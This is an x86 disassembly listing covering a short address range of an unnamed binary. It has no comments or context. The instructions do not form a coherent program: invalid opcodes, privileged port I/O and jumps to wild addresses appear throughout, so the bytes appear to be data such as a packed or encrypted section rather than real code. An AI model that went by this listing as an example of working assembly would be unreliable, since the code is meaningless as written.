  40bed1:	xchg   BYTE PTR [edi],ch
  40bed3:	rol    BYTE PTR gs:0x5f0869c3,0xc6
  40bedb:	fwait
  40bedc:	int3   
  40bedd:	pop    ebp
  40bede:	pusha  
  40bedf:	push   ebp
  40bee0:	fild   WORD PTR [esi+eax*8-0x15396271]
  40bee7:	push   edi
  40bee8:	fnstenv [edx]
  40beea:	sub    eax,DWORD PTR [edi]
  40beec:	pop    ss
  40beed:	inc    edx
  40beee:	xchg   esp,eax
  40beef:	and    dh,dl
  40bef1:	iret   
  40bef2:	push   ecx
  40bef3:	mov    esi,0x5499f66a
  40bef8:	in     al,dx
  40bef9:	test   eax,0x3cec7c78
  40befe:	popf   
  40beff:	into   
  40bf00:	add    DWORD PTR ds:0x8665d49b,edi
  40bf06:	sub    eax,0x9d769113
  40bf0b:	(bad)  
  40bf0c:	out    0x4d,eax
  40bf0e:	dec    edi
  40bf0f:	stos   BYTE PTR es:[edi],al
  40bf10:	jbe    0x40bf62
  40bf12:	je     0x40bf05
  40bf14:	aaa    
  40bf15:	cmp    bh,BYTE PTR [eax]
  40bf17:	int3   
  40bf18:	cmp    eax,0x7fe950c4
  40bf1d:	ds daa 
  40bf1f:	dec    edi
  40bf20:	xor    BYTE PTR [edi+0x11],dh
  40bf23:	and    dh,al
  40bf25:	add    ch,BYTE PTR [ebx]
  40bf27:	call   0x9c187fae
  40bf2c:	ss daa 
  40bf2e:	gs jp  0x40bf91
  40bf31:	loope  0x40bf62
  40bf33:	test   BYTE PTR [esi+0x831b71e],cl
  40bf39:	jmp    0x2e6d4689
  40bf3e:	adc    esp,eax
  40bf40:	js     0x40bf2c
  40bf42:	sub    DWORD PTR [ebx+0x3c],ebp
  40bf45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf46:	fdivrp st(2),st
  40bf48:	std    
  40bf49:	int    0xcd
  40bf4b:	outs   dx,DWORD PTR ds:[esi]
  40bf4c:	xor    eax,0x71759c43
  40bf51:	pop    ss
  40bf52:	out    dx,eax
  40bf53:	mov    edx,0x2c7e8ad8
  40bf58:	jecxz  0x40bee9
  40bf5a:	push   0x4eaf4db
  40bf5f:	sbb    dl,0x32
  40bf62:	adc    DWORD PTR [edx],esi
  40bf64:	cli    
  40bf65:	imul   ebp,DWORD PTR [eax-0x56],0xffffffc2
  40bf69:	pop    ss
  40bf6a:	test   eax,0x2a05e258
  40bf6f:	cs cld 
  40bf71:	jnp    0x40bf25
  40bf73:	and    bl,cl
  40bf75:	mov    ecx,esi
  40bf77:	add    al,0x34
  40bf79:	push   ebp
  40bf7a:	int3   
  40bf7b:	push   esi
  40bf7c:	xor    eax,0xd3287e8a
  40bf81:	and    al,0xa1
  40bf83:	push   ss
  40bf84:	pop    ecx
  40bf85:	xor    cl,dl
  40bf87:	xor    dl,bl
  40bf89:	xchg   DWORD PTR [ebp+0x47],esi
  40bf8c:	mov    ebx,0x9df17bb8
  40bf91:	cmp    al,dh
  40bf93:	jne    0x40bf6b
  40bf95:	pop    ss
  40bf96:	in     eax,0xd1
  40bf98:	ja     0x40bfec
  40bf9a:	fldenv ds:0x88062790
  40bfa0:	add    edx,DWORD PTR ds:0x7eb557c1
  40bfa6:	icebp  
  40bfa7:	xchg   BYTE PTR [ecx-0xb],bl
  40bfaa:	sbb    bh,BYTE PTR [edx+0x44]
  40bfad:	xor    eax,0x402f95c2
  40bfb2:	jg     0x40bfd0
  40bfb4:	lahf   
  40bfb5:	out    0x9,eax
  40bfb7:	(bad)  
  40bfba:	ror    BYTE PTR [edx],0x37
  40bfbd:	xchg   DWORD PTR [ebp-0xe075d05],esp
  40bfc3:	pop    ebx
  40bfc4:	mov    dl,0xa3
  40bfc6:	xchg   BYTE PTR [ebx+0x1a],bh
  40bfc9:	stc    
  40bfca:	xchg   esi,eax
  40bfcb:	ins    DWORD PTR es:[edi],dx
  40bfcc:	inc    ebp
  40bfcd:	stos   DWORD PTR es:[edi],eax
  40bfce:	imul   edx,esp,0x5a276490
  40bfd4:	and    al,BYTE PTR [ebx+ebx*8+0x6c9ac023]
  40bfdb:	ret    0xd432
  40bfde:	int    0x45
  40bfe0:	sub    DWORD PTR [edx+edx*1-0x440d5da9],ebx
  40bfe7:	rol    DWORD PTR [esi],cl
  40bfe9:	(bad)  
  40bfeb:	imul   esp,esp,0xffffff9c
  40bfee:	mov    ah,0x17
  40bff0:	mov    BYTE PTR [eax+0x71],bl
  40bff3:	dec    esp
  40bff4:	ret    0x9318
  40bff7:	or     dh,dl
  40bff9:	push   es
  40bffa:	imul   esi,esi,0x3c
  40bffd:	xchg   ebp,eax
  40bffe:	jnp    0x40bfb4
  40c000:	mov    eax,ds:0xfc10f246
  40c005:	inc    eax
  40c006:	xlat   BYTE PTR ds:[ebx]
  40c007:	mov    ch,0x57
  40c009:	imul   cx,WORD PTR [edi],0xbe45
  40c00e:	inc    edx
  40c00f:	mov    bl,0xf7
  40c011:	das    
  40c012:	cmp    BYTE PTR [edx-0x29e422f3],ah
  40c018:	int3   
  40c019:	into   
  40c01a:	test   BYTE PTR [ecx],0xcc
  40c01d:	adc    al,0x7f
  40c01f:	jae    0x40bfba
  40c021:	repnz or eax,0xbd528923
  40c027:	mov    ecx,0x17d8f90b
  40c02c:	add    DWORD PTR [ebx-0x15],ebp
  40c02f:	pop    esp
  40c030:	cmp    BYTE PTR [ecx],dh
  40c032:	sti    
  40c033:	dec    edx
  40c034:	mov    dl,0xfa
  40c036:	outs   dx,DWORD PTR ds:[esi]
  40c037:	ret    0xfc42
  40c03a:	ins    DWORD PTR es:[edi],dx
  40c03b:	sub    al,0x5e
  40c03d:	sub    al,0xc0
  40c03f:	cs jns 0x40bfd1
  40c042:	inc    eax
  40c043:	mov    al,ds:0x998f24ef
  40c048:	dec    eax
  40c049:	ret    
  40c04a:	push   0xffffff86
  40c04c:	inc    ebp
  40c04d:	add    eax,0x2cd4df87
  40c052:	cmp    edx,DWORD PTR [ebp-0x14]
  40c055:	sub    al,0x13
  40c057:	js     0x40c000
  40c059:	retf   0x5a04
  40c05c:	adc    DWORD PTR [eax-0x14],esi
  40c05f:	fldcw  WORD PTR [edx+esi*1+0x45]
  40c063:	test   cl,ah
  40c065:	dec    ebp
  40c066:	and    al,BYTE PTR [eax+0x1699756]
  40c06c:	xchg   esi,eax
  40c06d:	icebp  
  40c06e:	pop    ds
  40c06f:	js     0x40c0ed
  40c071:	jl     0x40c079
  40c073:	push   0x53
  40c075:	dec    esp
  40c076:	dec    esi
  40c077:	je     0x40c031
  40c079:	repnz (bad) 
  40c07b:	in     al,0x1d
  40c07d:	add    al,0x75
  40c080:	pop    ebp
  40c081:	mov    ah,0xe4
  40c083:	stos   BYTE PTR es:[edi],al
  40c084:	mov    ds:0x3cea2970,al
  40c089:	cmp    al,0xcf
  40c08b:	fld    st(0)
  40c08d:	stos   DWORD PTR es:[edi],eax
  40c08e:	mov    al,0xa6
  40c090:	cmp    eax,0x9f407534
  40c095:	test   eax,0xf7c26fd6
  40c09a:	in     al,dx
  40c09b:	or     ax,0xed50
  40c09f:	rcl    dl,0x50
  40c0a2:	int3   
  40c0a3:	sahf   
  40c0a4:	mov    cl,0x70
  40c0a6:	add    eax,0x1054d8b
  40c0ab:	jnp    0x40c086
  40c0ad:	loope  0x40c0a7
  40c0af:	cwde   
  40c0b0:	test   DWORD PTR [eax],esi
  40c0b2:	sub    ecx,DWORD PTR [edx+edi*1+0x26]
  40c0b6:	fucomp st(7)
  40c0b8:	add    BYTE PTR [ebp-0x96b30f8],bh
  40c0be:	adc    BYTE PTR [eax-0x6da06844],bl
  40c0c4:	sub    ebp,0x2b15c3eb
  40c0ca:	xchg   ecx,eax
  40c0cb:	sti    
  40c0cc:	call   0x1ace8520
  40c0d1:	stos   DWORD PTR es:[edi],eax
  40c0d2:	retf   0x10d7
  40c0d5:	dec    edx
  40c0d6:	jg     0x40c0f2
  40c0d8:	xchg   bl,dl
  40c0da:	push   eax
  40c0db:	jge    0x40c153
  40c0dd:	(bad)  
  40c0de:	clc    
  40c0df:	jmp    DWORD PTR [ebx-0x1f]
  40c0e2:	jl     0x40c076
  40c0e4:	or     ebp,ebp
  40c0e6:	adc    BYTE PTR [ecx-0x41],0x17
  40c0ea:	fimul  WORD PTR [eax-0x4209b81b]
  40c0f0:	xchg   DWORD PTR [esi],ebx
  40c0f2:	fst    QWORD PTR [ebx+0x4b0a2c4b]
  40c0f8:	stc    
  40c0f9:	out    0x89,al
  40c0fb:	or     esp,DWORD PTR [ebp-0x4c]
  40c0fe:	test   eax,0x97f22357
  40c103:	repnz sbb eax,0xeacfb9e1
  40c109:	adc    esi,DWORD PTR [ebx]
  40c10b:	ror    BYTE PTR [esi],0xc5
  40c10e:	mov    bl,0x71
  40c110:	mov    bh,0x53
  40c112:	or     DWORD PTR [ebx-0x13d15793],ebx
  40c118:	sub    BYTE PTR [eax+0x18870032],dl
  40c11e:	fmul   QWORD PTR [ebx+ecx*4+0x24]
  40c122:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c123:	pushf  
  40c124:	cmp    al,0x33
  40c126:	ja     0x40c197
  40c128:	cmp    ah,0x35
  40c12b:	jmp    0xd7dd:0xcc669dfe
  40c132:	enter  0x8fdf,0x1d
  40c136:	(bad)
  40c139:	add    DWORD PTR [ebx],esi
  40c13b:	loope  0x40c1b9
  40c13d:	pusha  
  40c13e:	cmp    ebx,DWORD PTR [eax+ecx*8+0x2ff527f2]
  40c145:	nop
  40c146:	cmp    DWORD PTR [edi+0x22790112],esi
  40c14c:	mov    ah,0x29
  40c14e:	dec    esi
  40c14f:	imul   ebx,DWORD PTR [ecx-0x4a],0x70
  40c153:	cmp    ebp,DWORD PTR [ebx+0x500d48d5]
  40c159:	sbb    esp,DWORD PTR [esi+ecx*2-0x62be33ba]
  40c160:	push   ds
  40c161:	push   esi
  40c162:	les    esp,FWORD PTR [ecx+eax*2+0x1a]
  40c166:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c167:	ror    DWORD PTR [edi+0x4c],1
  40c16a:	dec    DWORD PTR cs:[ebx]
  40c16d:	retf   0x2fcf
  40c170:	repnz add eax,0x577a8006
  40c176:	repz mov eax,ebx
  40c179:	(bad)  
  40c17a:	inc    ebx
  40c17b:	gs stos BYTE PTR es:[edi],al
  40c17d:	adc    esi,DWORD PTR ds:0x8aad9bd1
  40c183:	jmp    edi
  40c185:	pop    ss
  40c186:	lods   al,BYTE PTR ds:[esi]
  40c187:	sti    
  40c188:	sbb    al,0x50
  40c18a:	xor    al,0x7d
  40c18c:	enter  0x7bd2,0x2a
  40c190:	or     eax,0x4e05cb8b
  40c195:	push   0x23
  40c197:	ja     0x40c166
  40c199:	push   0x600c1d6b
  40c19e:	shl    DWORD PTR [ebp-0x42],0x81
  40c1a2:	out    dx,al
  40c1a3:	inc    edi
  40c1a4:	jbe    0x40c1c5
  40c1a6:	clc    
  40c1a7:	mov    al,ds:0xcd0cd886
  40c1ac:	jmp    0xd5bea850
  40c1b1:	sbb    ecx,DWORD PTR [eax-0x418b8b2]
  40c1b7:	or     eax,0x7bfcfb4b
  40c1bc:	jp     0x40c17b
  40c1be:	hlt    
  40c1bf:	nop
  40c1c0:	jbe    0x40c229
  40c1c2:	adc    BYTE PTR [edx-0x68],bh
  40c1c5:	inc    ebx
  40c1c6:	push   ebp
  40c1c7:	adc    al,0x0
  40c1c9:	add    DWORD PTR [edi-0x4cfd5c13],ebx
  40c1cf:	jbe    0x40c223
  40c1d1:	scas   al,BYTE PTR es:[edi]
  40c1d2:	and    BYTE PTR fs:[eax+0x58e33198],dh
  40c1d9:	sbb    cl,al
  40c1db:	out    0x68,eax
  40c1dd:	in     al,dx
  40c1de:	call   0x4709a132
  40c1e3:	(bad)  
  40c1e4:	mov    al,0x51
  40c1e6:	sbb    DWORD PTR [ebx+0x75],edx
  40c1e9:	mov    ebp,0x43b94864
  40c1ee:	out    dx,al
  40c1ef:	xor    edx,DWORD PTR [ebp+0x6976b0f2]
  40c1f5:	cmp    eax,0x11419462
  40c1fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1fb:	in     al,0x0
  40c1fd:	cli    
  40c1fe:	sete   BYTE PTR [edx-0x288b68b4]
  40c205:	arpl   WORD PTR [edx],si
  40c207:	dec    edx
  40c208:	push   ecx
  40c209:	popf   
  40c20a:	mov    ebx,0x55be69e8
  40c20f:	stos   DWORD PTR es:[edi],eax
  40c210:	mov    ebx,0xc5641ce0
  40c215:	pushf  
  40c216:	sbb    DWORD PTR [esi-0x7f],0x5b152e79
  40c21d:	lock mov DWORD PTR [edi-0x9f403ab],eax
  40c224:	sub    ebx,DWORD PTR [ecx]
  40c226:	sub    DWORD PTR [eax-0xf],ebp
  40c229:	pop    eax
  40c22a:	or     edi,DWORD PTR [edi-0x224c2d53]
  40c230:	rol    BYTE PTR [edi+0x50],1
  40c233:	mov    esi,0x417d2aab
  40c238:	dec    edx
  40c239:	fisttp QWORD PTR [ecx+0x3154a77f]
  40c23f:	sbb    al,0xf5
  40c241:	pop    esp
  40c242:	sbb    dh,BYTE PTR [ecx+0x656b2ca]
  40c248:	scas   eax,DWORD PTR es:[edi]
  40c249:	cmp    DWORD PTR [ebx+0x33b8543f],0xeaac260d
  40c253:	je     0x40c292
  40c255:	bound  esi,QWORD PTR [ebx-0x94cfd85]
  40c25b:	mov    ds,WORD PTR [ebx]
  40c25d:	call   0x8d81:0x343f41ea
  40c264:	adc    edx,DWORD PTR [ecx]
  40c266:	jbe    0x40c27f
  40c268:	gs inc edx
  40c26a:	adc    eax,0xecf8d7cf
  40c26f:	jo     0x40c294
  40c271:	or     ch,0x36
  40c274:	test   dh,bl
  40c276:	(bad)  
  40c277:	fs popa 
  40c279:	cmp    bh,BYTE PTR [edx+0x3]
  40c27c:	sub    DWORD PTR [eax],ecx
  40c27e:	xlat   BYTE PTR ds:[ebx]
  40c27f:	or     ah,BYTE PTR [esi+0x7e4dab78]
  40c285:	(bad)  
  40c286:	jb     0x40c2c1
  40c288:	and    ah,dl
  40c28a:	test   DWORD PTR [ecx+0x3b],esp
  40c28d:	retf   
  40c28e:	and    esp,esp
  40c290:	mov    ebp,0xa8dada45
  40c295:	std    
  40c296:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c297:	aas    
  40c298:	pop    edi
  40c299:	xchg   edi,eax
  40c29a:	xchg   edi,eax
  40c29b:	fldenv [ecx-0x7389d90f]
  40c2a1:	lods   al,BYTE PTR ds:[esi]
  40c2a2:	retf   
  40c2a3:	popf   
  40c2a4:	pop    ecx
  40c2a5:	cmp    edx,DWORD PTR [edi-0x7d53f21b]
  40c2ab:	jbe    0x40c298
  40c2ad:	inc    eax
  40c2ae:	pop    edi
  40c2af:	hlt    
  40c2b0:	or     DWORD PTR [ebx],ebx
  40c2b2:	jnp    0x40c292
  40c2b4:	or     esp,DWORD PTR ds:0xe4bca7c2
  40c2ba:	in     eax,0xe3
  40c2bc:	xor    esp,DWORD PTR [ebx]
  40c2be:	mov    dh,0x28
  40c2c0:	(bad)
  40c2c3:	(bad)  
  40c2c5:	xchg   ebp,eax
  40c2c6:	push   0x2e
  40c2c8:	or     al,0x71
  40c2ca:	imul   bl
  40c2cc:	fistp  QWORD PTR [ecx]
  40c2ce:	inc    eax
  40c2cf:	push   0x1cb798dc
  40c2d4:	mov    bh,0x72
  40c2d6:	xor    al,0x4c
  40c2d8:	mov    al,0x97
  40c2da:	les    esi,FWORD PTR [esi+0x5c]
  40c2dd:	mov    cl,0xd9
  40c2df:	cmp    edi,0x62
  40c2e2:	scas   al,BYTE PTR es:[edi]
  40c2e3:	fistp  WORD PTR [ecx]
  40c2e5:	lock adc al,0xf8
  40c2e8:	ret    
  40c2e9:	cmp    bl,BYTE PTR [edx]
  40c2eb:	cmp    BYTE PTR [eax+0x36],0xc2
  40c2ef:	dec    ebx
  40c2f0:	inc    edi
  40c2f1:	fwait
  40c2f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c2f3:	sar    cl,0x88
  40c2f6:	gs inc ecx
  40c2f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c2f9:	add    esi,ebx
  40c2fb:	mov    esi,0xa74e9e3b
  40c300:	sub    al,0xa5
  40c302:	test   DWORD PTR [ecx-0x19f4a29a],edx
  40c308:	or     al,0x43
  40c30a:	loope  0x40c295
  40c30c:	ret    
  40c30d:	or     bh,BYTE PTR [ecx-0x3e081f9e]
  40c313:	adc    DWORD PTR [eax-0x64],0x8abdc54b
  40c31a:	fs push esi
  40c31c:	add    edi,DWORD PTR ss:[edx-0x633d2ed0]
  40c323:	mov    al,0x42
  40c325:	iret   
  40c326:	fisubr WORD PTR [edx-0x4a]
  40c329:	jns    0x40c311
  40c32b:	loopne 0x40c305
  40c32d:	lahf   
  40c32e:	es ss and al,0x40
  40c332:	push   ebx
  40c333:	lods   eax,DWORD PTR ds:[esi]
  40c334:	jb     0x40c33c
  40c336:	inc    edi
  40c337:	or     al,0x94
  40c339:	mov    edx,0xb446ad6d
  40c33e:	lea    ebp,[edx+0x3]
  40c341:	(bad)  
  40c342:	in     eax,dx
  40c343:	jnp    0x40c319
  40c345:	push   0xffffffb0
  40c347:	out    dx,al
  40c348:	dec    edx
  40c349:	loope  0x40c303
  40c34b:	ret    0xe575
  40c34e:	mov    edx,0xd2dcd4cd
  40c353:	mov    al,0xf4
  40c355:	xchg   dl,dh
  40c357:	push   eax
  40c358:	mov    cl,0x1b
  40c35a:	xor    dh,BYTE PTR [esi-0x7dc28218]
  40c360:	or     al,dl
  40c362:	xor    edi,DWORD PTR [ebx+0x77f7aa2f]
  40c368:	sub    bl,BYTE PTR [esi-0x76]
  40c36b:	pop    ecx
  40c36c:	sbb    DWORD PTR [edi+0x74864d7f],ebp
  40c372:	outs   dx,BYTE PTR ds:[esi]
  40c373:	ret    
  40c374:	xor    eax,0x2b43e851
  40c379:	xlat   BYTE PTR ds:[ebx]
  40c37a:	shr    BYTE PTR [ecx-0x41d1d4af],cl
  40c380:	ret    
  40c381:	in     eax,0xa
  40c383:	icebp  
  40c384:	pushf  
  40c385:	inc    ecx
  40c386:	jl     0x40c3aa
  40c388:	loope  0x40c359
  40c38a:	repnz in al,dx
  40c38c:	repnz enter 0x5320,0x4a
  40c391:	cmp    al,al
  40c393:	adc    al,0xb0
  40c395:	jp     0x40c3cf
  40c397:	mov    dh,0x71
  40c399:	js     0x40c386
  40c39b:	cmp    eax,0x6dae30ca
  40c3a0:	jmp    0xa786b925
  40c3a5:	mov    edx,0xdcfecc
  40c3aa:	push   eax
  40c3ab:	xor    al,ch
  40c3ad:	mov    ebx,0x74160c48
  40c3b2:	fs sub eax,edx
  40c3b5:	or     eax,0x2e4ea0ca
  40c3ba:	retf   0x4e63
  40c3bd:	mov    ch,0x8a
  40c3bf:	or     ch,BYTE PTR [edi-0xc4d918f]
  40c3c5:	hlt    
  40c3c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c3c7:	adc    ebx,DWORD PTR [ebp+0x6]
  40c3ca:	(bad)  
  40c3cb:	ror    DWORD PTR [ecx+0x73f67c86],1
  40c3d1:	mov    ds:0x746acf47,eax
  40c3d6:	sub    bl,dl
  40c3d8:	jne    0x40c3ba
  40c3da:	neg    bl
  40c3dc:	and    eax,0xe8e7a270
  40c3e1:	fcmovbe st,st(1)
  40c3e3:	rcl    DWORD PTR [esi+esi*2+0x656665f8],1
  40c3ea:	mov    al,BYTE PTR [edi+0x54b17c8a]
  40c3f0:	cmp    BYTE PTR [edi],bh
  40c3f2:	enter  0x6e98,0x61
  40c3f6:	push   ds
  40c3f7:	loopne 0x40c392
  40c3f9:	mov    cl,0xdc
  40c3fb:	push   0x35
  40c3fd:	pop    eax
  40c3fe:	push   cs
  40c3ff:	not    ah
  40c401:	cdq    
  40c402:	jno    0x40c44a
  40c404:	pop    ds
  40c405:	les    cx,DWORD PTR [eax+0x6a738db8]
  40c40c:	mov    ch,0xd0
  40c40e:	mov    edi,0x53ef96a
  40c413:	out    0xed,eax
  40c415:	in     eax,dx
  40c416:	xchg   ebp,eax
  40c417:	cmp    BYTE PTR gs:[eax],dl
  40c41a:	mov    esi,0x35288bce
  40c41f:	shl    DWORD PTR [esp+edi*8],1
  40c422:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c423:	aad    0xd3
  40c425:	fsubr  DWORD PTR [esi]
  40c427:	neg    BYTE PTR [eax]
  40c429:	fmulp  st(5),st
  40c42b:	inc    ebp
  40c42c:	xchg   ecx,eax
  40c42d:	mov    ebp,0xd1a28b42
  40c432:	mov    bl,0xa2
  40c434:	cli    
  40c435:	jmp    0x40c3db
  40c437:	loopne 0x40c458
  40c439:	pop    ecx
  40c43a:	call   0xbff4:0x91e262c8
  40c441:	pop    esp
  40c442:	(bad)  
  40c443:	loop   0x40c416
  40c445:	test   dl,al
  40c447:	or     DWORD PTR [ebx+0x6f],0xdd055d30
  40c44e:	adc    BYTE PTR [eax],bh
  40c450:	mov    al,0x42
  40c452:	sbb    eax,0xa755b3df
  40c457:	enter  0x5fc2,0xa2
  40c45b:	push   ebp
  40c45d:	and    al,0x24
  40c45f:	ss push si
  40c462:	shr    DWORD PTR [edi-0x3fdfc8bf],1
  40c468:	push   ds
  40c469:	scas   al,BYTE PTR es:[edi]
  40c46a:	icebp  
  40c46b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c46c:	sar    BYTE PTR [edx-0xb4b6aa3],1
  40c472:	arpl   WORD PTR [eax+ebx*2+0x74],sp
  40c476:	ret    0x9db5
  40c479:	popf   
  40c47a:	pusha  
  40c47b:	std    
  40c47c:	sub    bh,BYTE PTR [edx]
  40c47e:	sub    bh,bl
  40c480:	je     0x40c4df
  40c482:	adc    eax,0x8bfa589f
  40c487:	push   esi
  40c488:	jo     0x40c4c0
  40c48a:	(bad)  
  40c48b:	push   ss
  40c48c:	mov    edi,0xcc934684
  40c491:	mov    edx,0xd2f6b665
  40c496:	jg     0x40c496
  40c498:	pop    eax
  40c499:	jo     0x40c489
  40c49b:	lock shr DWORD PTR [edi-0x326e589b],cl
  40c4a2:	push   cs
  40c4a3:	jnp    0x40c497
  40c4a5:	stos   DWORD PTR es:[edi],eax
  40c4a6:	adc    ch,BYTE PTR [ebx+eiz*4-0x9]
  40c4aa:	pop    es
  40c4ab:	imul   eax,DWORD PTR [ebx+0x44],0x504b2f20
  40c4b2:	fcom   DWORD PTR [ebx-0x1]
  40c4b5:	call   0xeae:0x2b26f0aa
  40c4bc:	jmp    0xa32:0x6ed78d1a
  40c4c3:	popa   
  40c4c4:	out    0xa5,al
  40c4c6:	fst    QWORD PTR [ebp-0x2ef7bc5b]
  40c4cc:	aam    0x40
  40c4ce:	stos   DWORD PTR es:[edi],eax
  40c4cf:	mov    esp,0x450d5067
  40c4d4:	adc    al,0x5a
  40c4d6:	dec    esi
  40c4d7:	ins    DWORD PTR es:[edi],dx
  40c4d8:	loope  0x40c521
  40c4da:	cmp    al,0xd9
  40c4dc:	scas   eax,DWORD PTR es:[edi]
  40c4dd:	scas   eax,DWORD PTR es:[edi]
  40c4de:	dec    esi
  40c4df:	or     al,0xe6
  40c4e1:	or     BYTE PTR ds:0xf98060a9,0x93
  40c4e8:	mov    edx,0x5fb5701b
  40c4ed:	lahf   
  40c4ee:	fmul   QWORD PTR [ebp-0x7c]
  40c4f1:	(bad)  
  40c4f2:	xsavec [eax-0x1de7fb7f]
  40c4f9:	aam    0x3b
  40c4fb:	sub    eax,0x26d589f9
  40c500:	push   ss
  40c501:	sub    al,0x79
  40c503:	mov    eax,ds:0xf19329b1
  40c508:	mov    esp,DWORD PTR [edi+eax*4]
  40c50b:	out    0x4d,al
  40c50d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c50e:	inc    ebx
  40c50f:	adc    DWORD PTR [eax-0xd],ebp
  40c512:	push   edx
  40c513:	pop    edi
  40c514:	and    ebp,ebp
  40c516:	shl    BYTE PTR [ebp-0x24f60be3],cl
  40c51c:	pop    edx
  40c51d:	call   0x45d3856a
  40c522:	jg     0x40c589
  40c524:	ds push esp
  40c526:	cmp    al,0x2e
  40c528:	shl    BYTE PTR [eax+eiz*1-0x3a],cl
  40c52c:	dec    edi
  40c52d:	outs   dx,DWORD PTR fs:[esi]
  40c52f:	xchg   BYTE PTR [eax-0x59d2ab10],bl
  40c535:	ret    
  40c536:	pop    esi
  40c537:	mov    bh,0x55
  40c539:	jecxz  0x40c50a
  40c53b:	xor    dh,bl
  40c53d:	mov    ah,0x9f
  40c53f:	xchg   BYTE PTR [eax],ah
  40c541:	test   bh,ah
  40c543:	popa   
  40c544:	or     bh,cl
  40c546:	mul    DWORD PTR [edi]
  40c548:	test   al,0x44
  40c54a:	stos   DWORD PTR es:[edi],eax
  40c54b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c54c:	sub    BYTE PTR [esi],bh
  40c54e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c54f:	shr    DWORD PTR [eax-0x5a],cl
  40c552:	xor    esp,esp
  40c554:	adc    ch,dh
  40c556:	mov    WORD PTR [edx],es
  40c558:	push   eax
  40c559:	push   eax
  40c55a:	pop    ecx
  40c55b:	(bad)  
  40c55c:	jb     0x40c51f
  40c55e:	adc    al,0xfc
  40c560:	xor    bl,bl
  40c562:	es xor al,0xaf
  40c565:	mov    eax,ds:0x402fa811
  40c56a:	ficomp WORD PTR [ebp-0x56ef29c]
  40c570:	jecxz  0x40c585
  40c572:	std    
  40c573:	imul   esi,DWORD PTR [ebp+0x6722bb84],0x73640e66
  40c57d:	ins    BYTE PTR es:[edi],dx
  40c57e:	les    ecx,FWORD PTR [esi-0x46]
  40c581:	fcmovnu st,st(3)
  40c583:	xchg   ecx,eax
  40c584:	mov    esp,DWORD PTR [eax+esi*4-0x16]
  40c588:	xchg   esp,eax
  40c589:	push   cs
  40c58a:	push   0xffffff8e
  40c58c:	sar    DWORD PTR [ecx+0x57ac23a3],0x90
  40c593:	mov    cl,0xbb
  40c595:	fmul   QWORD PTR [ecx-0x5f26bfc2]
  40c59b:	cwde   
  40c59c:	pop    ebx
  40c59d:	dec    edx
  40c59e:	enter  0x6ce7,0xd7
  40c5a2:	jge    0x40c596
  40c5a4:	fisttp DWORD PTR [edi-0xd]
  40c5a7:	ins    DWORD PTR es:[edi],dx
  40c5a8:	push   esi
  40c5a9:	dec    edx
  40c5aa:	inc    edi
  40c5ab:	in     eax,dx
  40c5ac:	xlat   BYTE PTR ds:[ebx]
  40c5ad:	adc    DWORD PTR [edi-0x75bf0cd],0xa3fff3b2
  40c5b7:	lock jns 0x40c5f9
  40c5ba:	push   cs
  40c5bb:	loop   0x40c570
  40c5bd:	es mov edx,0x79ab334
  40c5c3:	ja     0x40c5e3
  40c5c5:	mov    ebx,0x18015a1f
  40c5ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5cb:	push   ecx
  40c5cc:	pushf  
  40c5cd:	imul   esp,DWORD PTR [ebp+0x3],0xafcdb7ae
  40c5d4:	inc    edi
  40c5d5:	loope  0x40c5f8
  40c5d7:	pop    ecx
  40c5d8:	jae    0x40c586
  40c5da:	push   es
  40c5db:	lods   eax,DWORD PTR ds:[esi]
  40c5dc:	je     0x40c5cc
  40c5de:	ja     0x40c578
  40c5e0:	push   eax
  40c5e1:	mov    esp,0xb8543789
  40c5e6:	pop    ds
  40c5e7:	sbb    al,0x99
  40c5e9:	xchg   esi,eax
  40c5ea:	add    al,0x23
  40c5ec:	lds    edx,FWORD PTR [ecx+0x14]
  40c5ef:	sbb    dl,BYTE PTR [ecx+eax*1+0x5b2baaa]
  40c5f6:	stc    
  40c5f7:	inc    ebx
  40c5f8:	stc    
  40c5f9:	fist   WORD PTR [ecx+0x70]
  40c5fc:	add    eax,0xa947eed7
  40c601:	pop    ecx
  40c602:	sub    bl,bl
  40c604:	pop    ds
  40c605:	mov    bh,0xa7
  40c607:	xor    al,0x76
  40c609:	sub    al,0x5b
  40c60b:	(bad)  
  40c60c:	cmp    al,0x90
  40c60e:	xor    al,0xd8
  40c610:	pop    ss
  40c611:	stos   DWORD PTR es:[edi],eax
  40c612:	add    edi,DWORD PTR [eax]
  40c614:	lods   eax,DWORD PTR ds:[esi]
  40c615:	sub    eax,0x34cb1d1d
  40c61a:	dec    ecx
  40c61b:	add    esp,DWORD PTR [ebp+0xf31fee1]
  40c621:	push   edx
  40c622:	pop    esp
  40c623:	bound  ecx,QWORD PTR ds:0xc16eccdd
  40c629:	gs ss (bad) 
  40c62c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c62d:	xchg   edx,eax
  40c62e:	sub    al,0xca
  40c630:	pop    ss
  40c631:	shl    ebp,cl
  40c633:	popf   
  40c634:	and    edi,DWORD PTR [edi+0x14]
  40c637:	add    BYTE PTR [eax-0x7b],al
  40c63a:	sbb    BYTE PTR [eax+ebx*1+0x2db99736],bl
  40c641:	inc    edi
  40c642:	dec    esp
  40c643:	push   ecx
  40c644:	loop   0x40c660
  40c646:	cmp    eax,0x10442fbe
  40c64b:	test   al,0x50
  40c64d:	jl     0x40c64c
  40c64f:	push   esp
  40c650:	dec    edx
  40c651:	loopne 0x40c614
  40c653:	push   edi
  40c654:	and    ecx,DWORD PTR [ebp+0xe376ebb]
  40c65a:	std    
  40c65b:	mov    al,0x26
  40c65d:	mov    WORD PTR [eax+0x6a4519cf],ds
  40c663:	pushf  
  40c664:	(bad)  
  40c665:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c666:	retf   0x861d
  40c669:	clc    
